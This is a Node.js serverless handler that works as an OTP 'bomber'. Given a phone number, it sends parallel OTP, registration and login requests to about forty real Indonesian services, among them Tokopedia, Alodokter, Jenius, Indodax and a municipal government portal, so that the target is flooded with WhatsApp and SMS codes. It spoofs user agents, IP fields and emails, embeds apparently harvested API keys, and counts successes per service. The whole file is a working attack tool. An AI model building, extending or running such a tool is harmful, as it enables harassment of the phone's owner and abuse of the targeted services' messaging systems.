const crypto = require("crypto");

const UAS = [
  "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.163 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 12; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36",
  "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
  "Mozilla/5.0 (Linux; Android 13; SM-S911B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/25.0 Chrome/121.0.0.0 Mobile Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/120.0"
];

function ua() { return UAS[Math.floor(Math.random() * UAS.length)]; }
function rndIP() { return `${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`; }
function rndEmail() { return "u" + Math.random().toString(36).slice(2, 10) + "@gmail.com"; }

function variants(phone) {
  let clean = String(phone).replace(/\D/g, "");
  let core = clean.startsWith("62") ? clean.slice(2) : (clean.startsWith("0") ? clean.slice(1) : clean);
  return { "08": "0" + core, "nocode": core, "plus": "+62" + core, "62": "62" + core };
}

const ENDPOINTS = [
  // === FROM LATEST EXPRESS SAMPLE ===
  { name: "Maulagi", hit: async (v) => {
    const res = await fetch("https://api.maulagi.id/api/v2/auth/check", {
      method: "POST", headers: { "User-Agent": ua(), "Content-Type": "application/json", "X-ML-KEY": "B10JLPEP10" },
      body: JSON.stringify({ credentials: v["62"] }), signal: AbortSignal.timeout(12000)
    }); return res.status;
  }},
  { name: "Matahari", hit: async (v) => {
    const res = await fetch("https://matahari-backend-prod.matahari.com/api/auth/re-activation", {
      method: "POST", headers: { "User-Agent": ua(), "Content-Type": "application/json" },
      body: JSON.stringify({ mobileCountryCode: "", mobileNumber: v["08"], activationCode: "" }), signal: AbortSignal.timeout(12000)
    }); return res.status;
  }},
  { name: "Bonus Belanja", hit: async (v) => {
    const res = await fetch("https://www.bonusbelanja.com/api/auth/registration/app", {
      method: "POST", headers: { "User-Agent": ua(), "Content-Type": "application/json", "Origin": "https://www.bonusbelanja.com" },
      body: JSON.stringify({ phone: v["62"], name: "User", agreeTnc: true, agreeContact: false }), signal: AbortSignal.timeout(12000)
    }); return res.status;
  }},
  { name: "Alodokter", hit: async (v) => {
    const res = await fetch("https://www.alodokter.com/resend-otp", {
      method: "POST", headers: { "User-Agent": ua(), "Content-Type": "application/json" },
      body: JSON.stringify({ user: { phone: v["08"], uuid: crypto.randomUUID() }, request_via: "whatsapp" }), signal: AbortSignal.timeout(12000)
    }); return res.status;
  }},
  { name: "Beautyhaul", hit: async (v) => {
    const res = await fetch("https://www.beautyhaul.com/ajax/account/send_otp", {
      method: "POST", headers: { "User-Agent": ua(), "Content-Type": "application/json" },
      body: JSON.stringify({ method: "WhatsApp", phone: v["62"] }), signal: AbortSignal.timeout(12000)
    }); return res.status;
  }},
  { name: "Gritero/Ocistok", hit: async (v) => {
    const res = await fetch("https://gateway.gritero.com/v1/auth/registration/whatsapp/send-otp?langcode=id", {
      method: "POST", headers: { "User-Agent": ua(), "Content-Type": "application/json", "Xid": String(Math.floor(Math.random()*9e6)+1e6), "source": "ocistok" },
      body: JSON.stringify({ nama_lengkap: "User", telepon: v["08"], email: rndEmail() }), signal: AbortSignal.timeout(12000)
    }); return res.status;
  }},
  { name: "Internet Rakyat", hit: async (v) => {
    const res = await fetch("https://internetrakyat.id/api/app/auth/send-otp-register", {
      method: "POST", headers: { "User-Agent": ua(), "Content-Type": "application/json", "x-api-key": "280999!FTTH", "Origin": "https://internetrakyat.id" },
      body: JSON.stringify({ phone_number: v["08"] }), signal: AbortSignal.timeout(12000)
    }); return res.status;
  }},
  { name: "Dokterin", hit: async (v) => {
    const res = await fetch("https://api.dokterin.id/user/v1/users/login", {
      method: "POST", headers: { "User-Agent": ua(), "Content-Type": "application/json", "Origin": "https://dokterin.id" },
      body: JSON.stringify({ phone: v["62"], tnc_accept: true, device_id: crypto.randomUUID() }), signal: AbortSignal.timeout(12000)
    }); return res.status;
  }},
  { name: "Paper.id Login", hit: async (v) => {
    const res = await fetch("https://api.paper.id/api/v1/auth/login", {
      method: "POST", headers: { "User-Agent": ua(), "Content-Type": "application/json", "Origin": "https://www.paper.id", "x-paper-user-agent": "Jupiter/7.19.5 desktop", "request-id": crypto.randomUUID() },
      body: JSON.stringify({ method: "whatsapp", phone: v["08"] }), signal: AbortSignal.timeout(12000)
    }); return res.status;
  }},
  { name: "Paper.id Register", hit: async (v) => {
    const res = await fetch("https://register.paper.id/api/v1/auth/register/send-otp", {
      method: "POST", headers: { "User-Agent": ua(), "Content-Type": "application/json" },
      body: JSON.stringify({ phone: v["62"], method: "whatsapp", registered_by: "web" }), signal: AbortSignal.timeout(12000)
    }); return res.status;
  }},
  { name: "Indodax", hit: async (v) => {
    const res = await fetch("https://api.indodax.com/api/v1/otp/send", {
      method: "POST", headers: { "User-Agent": ua(), "Content-Type": "application/json", "Origin": "https://indodax.com", "key": "bAGUG2WiLy", "authorization": "Bearer bAGUG2WiLy" },
      body: JSON.stringify({ email: rndEmail(), flow: "register", method: "whatsapp", old_uuid: "" }), signal: AbortSignal.timeout(12000)
    }); return res.status;
  }},
  { name: "Bunda", hit: async (v) => {
    const res = await fetch("https://cms.bunda.co.id/api/v1/auth/send-otp", {
      method: "POST", headers: { "User-Agent": ua(), "Content-Type": "application/json", "Origin": "https://www.bunda.co.id", "X-Requested-With": "XMLHttpRequest", "X-Locale": "id" },
      body: JSON.stringify({ phone_number: v["62"], type: "auth" }), signal: AbortSignal.timeout(12000)
    }); return res.status;
  }},
  { name: "Fastwork", hit: async (v) => {
    const res = await fetch("https://api.fastwork.id/auth/v2/signup.sendVerificationCode", {
      method: "POST", headers: { "User-Agent": ua(), "Content-Type": "application/json" },
      body: JSON.stringify({ phone_number: v["08"] }), signal: AbortSignal.timeout(12000)
    }); return res.status;
  }},
  { name: "Rumah123", hit: async (v) => {
    const res = await fetch("https://www.rumah123.com/api/otp/request-otp", {
      method: "POST", headers: { "User-Agent": ua(), "Content-Type": "application/json", "Base-Url-Core": "https://www.rumah123.com" },
      body: JSON.stringify({ ipAddress: rndIP(), phoneNumber: v["62"], portalId: 1, type: "WHATSAPP", url: "https://www.rumah123.com/user/login" }), signal: AbortSignal.timeout(12000)
    }); return res.status;
  }},
  { name: "Blibli/Tiket", hit: async (v) => {
    const res = await fetch("https://account.bliblitiket.com/gateway/gks-unm-go-be/api/v1/otp/generate", {
      method: "POST", headers: { "User-Agent": ua(), "Content-Type": "application/json" },
      body: JSON.stringify({ action: "REGISTER_OTP", channel: "WHATS_APP", recipient: v["62"], recaptchaToken: "" }), signal: AbortSignal.timeout(12000)
    }); return res.status;
  }},
  { name: "Adiraku", hit: async (v) => {
    const res = await fetch("https://prod.adiraku.co.id/ms-auth/auth/generate-otp-vdata", {
      method: "POST", headers: { "User-Agent": ua(), "Content-Type": "application/json" },
      body: JSON.stringify({ mobileNumber: v["nocode"], type: "prospect-create", channel: "whatsapp" }), signal: AbortSignal.timeout(12000)
    }); return res.status;
  }},
  { name: "Sicepat", hit: async (v) => {
    const res = await fetch(`https://api.sicepatconsumer.com/v3/masterdata/user/otp/request/${v["62"]}?sms=false`, {
      method: "GET", headers: { "User-Agent": ua(), "x-recaptcha": "acf49209:033951e729315ba" },
      signal: AbortSignal.timeout(12000)
    }); return res.status;
  }},

  // === PREVIOUS HARDENED ===
  { name: "BYU", hit: async (v) => {
    const res = await fetch("https://pidaw-app.cx.byu.id/api/v3/user-service/v6/id/en-US/WEB/signin/otp", {
      method: "POST", headers: {
        "User-Agent": ua(), "Accept": "application/json", "Content-Type": "application/json",
        "Origin": "https://pidaw-webfront.cx.byu.id", "Referer": "https://pidaw-webfront.cx.byu.id/",
        "x-request-id": crypto.randomUUID(), "x-deviceid": String(Math.floor(Math.random()*1e20)+1e19), "slocation": "CL"
      },
      body: JSON.stringify({ identifier: v["nocode"], channel: "web" }), signal: AbortSignal.timeout(12000)
    }); return res.status;
  }},
  { name: "Skul.id", hit: async (v) => {
    try {
      await fetch("https://api3.skul.id/v1/auth/check-identifier", {
        method: "POST", headers: { "User-Agent": ua(), "Content-Type": "application/json", "Origin": "https://my.skul.id" },
        body: JSON.stringify({ identifier: v["08"] }), signal: AbortSignal.timeout(8000)
      });
    } catch (_) {}
    const body = new URLSearchParams({ phone: v["08"], type: "register", channel: "sms", stakeholder: "" });
    const res = await fetch("https://api2.skul.id/v2/otp/request", {
      method: "POST", headers: {
        "User-Agent": ua(), "Content-Type": "application/x-www-form-urlencoded",
        "Origin": "https://my.skul.id", "authorization": "Bearer undefined"
      },
      body: body.toString(), signal: AbortSignal.timeout(12000)
    }); return res.status;
  }},
  { name: "Auto2000", hit: async (v) => {
    const res = await fetch("https://auto2000.co.id/api/customer/v1/saphybris/whatsapp/generate-otp", {
      method: "POST", headers: { "User-Agent": ua(), "Content-Type": "application/json", "Origin": "https://auto2000.co.id" },
      body: JSON.stringify({ phoneNumber: v["08"], isCheckOtpLimit: true, uniqueID: v["08"], isLogin: false }), signal: AbortSignal.timeout(12000)
    }); return res.status;
  }},
  { name: "SIDEMANG", hit: async (v) => {
    const res = await fetch("https://sidemang.palembang.go.id/api/users/register/send-otp", {
      method: "POST", headers: { "User-Agent": ua(), "Content-Type": "application/json", "Origin": "https://sidemang.palembang.go.id" },
      body: JSON.stringify({ phoneNumber: v["08"], email: rndEmail() }), signal: AbortSignal.timeout(12000)
    }); return res.status;
  }},
  { name: "DuniaGames", hit: async (v) => {
    const res = await fetch("https://api.duniagames.co.id/api/user/api/v2/user/send-otp", {
      method: "POST", headers: { "User-Agent": ua(), "Content-Type": "application/json", "Origin": "https://duniagames.co.id", "x-device": crypto.randomUUID() },
      body: JSON.stringify({ phoneNumber: v["plus"], userName: v["nocode"] }), signal: AbortSignal.timeout(12000)
    }); return res.status;
  }},
  { name: "PlanetBan", hit: async (v) => {
    const res = await fetch("https://api.planetban.com/website/customer/request-otp", {
      method: "POST", headers: { "User-Agent": ua(), "Content-Type": "application/json", "Origin": "https://planetban.com" },
      body: JSON.stringify({ name: "Test", phone: v["08"], password: "Test123", purpose: "register", method: "whatsapp" }), signal: AbortSignal.timeout(12000)
    }); return res.status;
  }},
  { name: "Tri (3)", hit: async (v) => {
    const res = await fetch("https://registrasi.tri.co.id/api/v1/generate-otp", {
      method: "POST", headers: { "User-Agent": ua(), "Content-Type": "application/json", "Origin": "https://registrasi.tri.co.id" },
      body: JSON.stringify({ msisdn: v["62"], type: "sms" }), signal: AbortSignal.timeout(12000)
    }); return res.status;
  }},
  { name: "Pizza Hut", hit: async (v) => {
    const res = await fetch("https://api-prod.pizzahut.co.id/customer/v1/customer/register", {
      method: "POST", headers: {
        "User-Agent": ua(), "Content-Type": "application/json;charset=UTF-8",
        "x-device-type": "PC", "x-platform": "WEBMOBILE", "x-channel": "2",
        "x-client-id": crypto.randomUUID(), "x-lang": "en", "x-device-id": "web",
        "Origin": "https://www.pizzahut.co.id"
      },
      body: JSON.stringify({ email: rndEmail(), first_name: "User", last_name: "Test", password: "Pass123!", phone: v["08"], birthday: "2000-01-02" }),
      signal: AbortSignal.timeout(12000)
    }); return res.status;
  }},
  { name: "Mister Aladin", hit: async (v) => {
    const res = await fetch("https://m.misteraladin.com/api/members/v2/otp/request", {
      method: "POST", headers: { "User-Agent": ua(), "Content-Type": "application/json", "x-platform": "mobile-web", "Origin": "https://m.misteraladin.com" },
      body: JSON.stringify({ phone_number_country_code: "62", phone_number: v["nocode"], type: "register" }), signal: AbortSignal.timeout(12000)
    }); return res.status;
  }},
  { name: "Jembatani", hit: async (v) => {
    const res = await fetch("https://api.jembatani.co.id/v1/register", {
      method: "POST", headers: { "User-Agent": ua(), "Content-Type": "application/json", "Origin": "https://jembatani.co.id" },
      body: JSON.stringify({ phone: v["08"], phone_number: v["08"] }), signal: AbortSignal.timeout(12000)
    }); return res.status;
  }},
  { name: "Astra Daihatsu", hit: async (v) => {
    const res = await fetch("https://www.astra-daihatsu.id/otp/whatsapp/generate", {
      method: "POST", headers: { "User-Agent": ua(), "Content-Type": "application/json", "Origin": "https://www.astra-daihatsu.id" },
      body: JSON.stringify({ phone: v["plus"] }), signal: AbortSignal.timeout(12000)
    }); return res.status;
  }},
  { name: "Royal Canin", hit: async (v) => {
    const res = await fetch("https://club.royalcanin.id/api/get_otp", {
      method: "POST", headers: { "User-Agent": ua(), "Content-Type": "application/json", "Origin": "https://club.royalcanin.id" },
      body: JSON.stringify({ phone: v["plus"] }), signal: AbortSignal.timeout(12000)
    }); return res.status;
  }},
  { name: "Payfazz", hit: async (v) => {
    const body = new URLSearchParams({ phone: v["08"] });
    const res = await fetch("https://api.payfazz.com/v2/phoneVerifications", {
      method: "POST", headers: { "User-Agent": ua(), "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "Origin": "https://www.payfazz.com" },
      body: body.toString(), signal: AbortSignal.timeout(12000)
    }); return res.status;
  }},
  { name: "Tokopedia", hit: async (v) => {
    const res = await fetch("https://accounts.tokopedia.com/otp/c/ajax/request-war", {
      method: "POST", headers: { "User-Agent": ua(), "Content-Type": "application/json", "X-Requested-With": "XMLHttpRequest", "Origin": "https://www.tokopedia.com" },
      body: JSON.stringify({ msisdn: v["62"], otp_type: "sms" }), signal: AbortSignal.timeout(12000)
    }); return res.status;
  }},
  { name: "Jenius", hit: async (v) => {
    const res = await fetch("https://api.btpn.com/jenius", {
      method: "POST", headers: {
        "User-Agent": "okhttp/3.12.1", "Content-Type": "application/json",
        "btpn-apikey": "f73eb34d-5bf3-42c5-b76e-271448c2e87d", "version": "2.36.1-7565",
        "accept-language": "id", "x-request-id": crypto.randomUUID()
      },
      body: JSON.stringify({
        query: "mutation registerPhone($phone: String!,$language: Language!) { registerPhone(input: {phone: $phone,language: $language}) { authId tokenId __typename } }",
        variables: { phone: v["plus"], language: "id" }, operationName: "registerPhone"
      }), signal: AbortSignal.timeout(12000)
    }); return res.status;
  }},
  { name: "Carsome", hit: async (v) => {
    const res = await fetch("https://www.carsome.id/website/login/sendSMS", {
      method: "POST", headers: { "User-Agent": ua(), "Content-Type": "application/json", "x-language": "id", "country": "ID", "Origin": "https://www.carsome.id" },
      body: JSON.stringify({ username: v["08"], optType: 1 }), signal: AbortSignal.timeout(12000)
    }); return res.status;
  }},
  { name: "Ginee", hit: async (v) => {
    const res = await fetch("https://accounts.ginee.com/api/iam-service/account/send-verification-code", {
      method: "POST", headers: { "User-Agent": ua(), "Content-Type": "application/json;charset=UTF-8", "Origin": "https://accounts.ginee.com" },
      body: JSON.stringify({ account: v["08"], countryCode: "ID", verificationPurpose: "USER_REGISTRATION", verificationType: "PHONE" }),
      signal: AbortSignal.timeout(12000)
    }); return res.status;
  }},
  { name: "Tokko", hit: async (v) => {
    const res = await fetch("https://api.tokko.io/graphql", {
      method: "POST", headers: {
        "User-Agent": ua(), "Content-Type": "application/json", "x-tokko-api-client": "merchant_web",
        "x-tokko-api-client-version": "4.5.1", "Origin": "https://web.lummoshop.com"
      },
      body: JSON.stringify({
        operationName: "generateOTP",
        variables: { generateOtpInput: { phoneNumber: v["plus"], hashCode: "", channel: "WHATSAPP", userType: "MERCHANT" } },
        query: "mutation generateOTP($generateOtpInput: GenerateOtpInput!) { generateOtp(generateOtpInput: $generateOtpInput) { phoneNumber } }"
      }), signal: AbortSignal.timeout(12000)
    }); return res.status;
  }},
  { name: "Foreign Admits", hit: async (v) => {
    const body = new URLSearchParams({ mobile: v["62"], countryCode: "+62" });
    const res = await fetch("https://foreignadmits.com/api/register-otp-generate-student", {
      method: "POST", headers: { "User-Agent": ua(), "Content-Type": "application/x-www-form-urlencoded" },
      body: body.toString(), signal: AbortSignal.timeout(12000)
    }); return res.status;
  }},
  { name: "Metro Indonesia", hit: async (v) => {
    const body = new URLSearchParams({ phoneno: v["08"] });
    const res = await fetch("http://access.metroindonesia.com/Member/sendpin", {
      method: "POST", headers: { "User-Agent": ua(), "Content-Type": "application/x-www-form-urlencoded" },
      body: body.toString(), signal: AbortSignal.timeout(12000)
    }); return res.status;
  }},
  { name: "Harnic", hit: async (v) => {
    const body = new URLSearchParams({ phone: v["08"] });
    const res = await fetch("https://harnic.id/login/phone_auth_OTP", {
      method: "POST", headers: { "User-Agent": ua(), "Content-Type": "application/x-www-form-urlencoded" },
      body: body.toString(), signal: AbortSignal.timeout(12000)
    }); return res.status;
  }},
  { name: "Tokomanamana", hit: async (v) => {
    const body = new URLSearchParams({ phone: v["08"] });
    const res = await fetch("https://tokomanamana.com/ma/auth/request_token_merchant/", {
      method: "POST", headers: {
        "User-Agent": ua(), "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "X-Requested-With": "XMLHttpRequest", "Origin": "https://tokomanamana.com", "Referer": "https://tokomanamana.com/ma/register"
      },
      body: body.toString(), signal: AbortSignal.timeout(12000)
    }); return res.status;
  }},
  { name: "Trimegah", hit: async (v) => {
    const body = new URLSearchParams({ noHp: v["08"], email: rndEmail() });
    const res = await fetch("https://sbn.trimegah.id/agent/register/sendOtp", {
      method: "POST", headers: { "User-Agent": ua(), "Content-Type": "application/x-www-form-urlencoded" },
      body: body.toString(), signal: AbortSignal.timeout(12000)
    }); return res.status;
  }},
  { name: "Klook", hit: async (v) => {
    const res = await fetch("https://www.klook.com/v2/userapisrv/public/verification/code/send?trace_id=" + crypto.randomUUID(), {
      method: "POST", headers: {
        "User-Agent": ua(), "Content-Type": "application/json", "x-platform": "mobile", "x-klook-market": "global", "version": "5.6",
        "Origin": "https://www.klook.com"
      },
      body: JSON.stringify({
        action: "login_register", type: 1, rcv: v["plus"], is_resend: false,
        payload: { mobile: v["plus"], term_ids: [330], mobile_token: "", invite_code: "" }
      }), signal: AbortSignal.timeout(12000)
    }); return res.status;
  }}
];

const API_KEY = "Patrick";

async function mapPool(items, limit, fn) {
  const ret = [];
  let i = 0;
  async function worker() {
    while (i < items.length) {
      const idx = i++;
      try { ret[idx] = await fn(items[idx]); }
      catch (e) { ret[idx] = { name: items[idx].name, status: "error", code: 0, msg: e.message }; }
    }
  }
  await Promise.all(Array.from({ length: Math.min(limit, items.length) }, () => worker()));
  return ret;
}

module.exports = async function handler(req, res) {
  res.setHeader("Access-Control-Allow-Origin", "*");
  res.setHeader("Access-Control-Allow-Methods", "POST, OPTIONS");
  res.setHeader("Access-Control-Allow-Headers", "Content-Type, X-API-KEY");
  if (req.method === "OPTIONS") return res.status(200).end();
  if (req.method !== "POST") return res.status(405).json({ error: "Method not allowed" });

  const key = req.headers["x-api-key"] || req.body?.key || "";
  if (key !== API_KEY) return res.status(401).json({ error: "Invalid API key" });

  const phoneRaw = req.body?.phone;
  if (!phoneRaw) return res.status(400).json({ error: "phone required" });

  const v = variants(phoneRaw);

  const results = await mapPool(ENDPOINTS, 6, async (ep) => {
    try {
      const code = await ep.hit(v);
      if (code >= 200 && code < 300) return { name: ep.name, status: "success", code };
      if (code === 429) return { name: ep.name, status: "rate", code };
      if (code >= 400 && code < 500) return { name: ep.name, status: "bad", code };
      return { name: ep.name, status: "error", code };
    } catch (e) {
      return { name: ep.name, status: "error", code: 0, msg: e.name === "TimeoutError" ? "timeout" : e.message };
    }
  });

  const summary = {
    success: results.filter(r => r.status === "success").length,
    rate: results.filter(r => r.status === "rate").length,
    bad: results.filter(r => r.status === "bad").length,
    error: results.filter(r => r.status === "error").length
  };

  return res.status(200).json({ phone: phoneRaw, total: results.length, summary, results });
};
